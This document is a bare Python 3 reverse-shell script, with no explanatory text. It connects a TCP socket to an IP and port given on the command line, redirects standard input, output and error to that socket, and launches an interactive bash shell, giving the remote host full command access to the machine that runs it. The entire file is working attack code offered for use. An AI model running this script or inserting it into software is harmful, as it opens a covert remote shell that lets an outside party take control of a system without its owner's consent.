#!/usr/bin/python3

import sys
from os import dup2
from subprocess import run
import socket

if len(sys.argv) == 3:
	ip = sys.argv[1]
	port = sys.argv[2]
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		s.connect((str(ip), int(port)))
	except ValueError:
		print("ValueError: Check correctly your write ip address and port")
	dup2(s.fileno(), 0)
	dup2(s.fileno(), 1)
	dup2(s.fileno(), 2)
	run(["/bin/bash", "-i"])
else:
	print(f"Usage: python3 {sys.argv[0]} <lhost> <lport>")
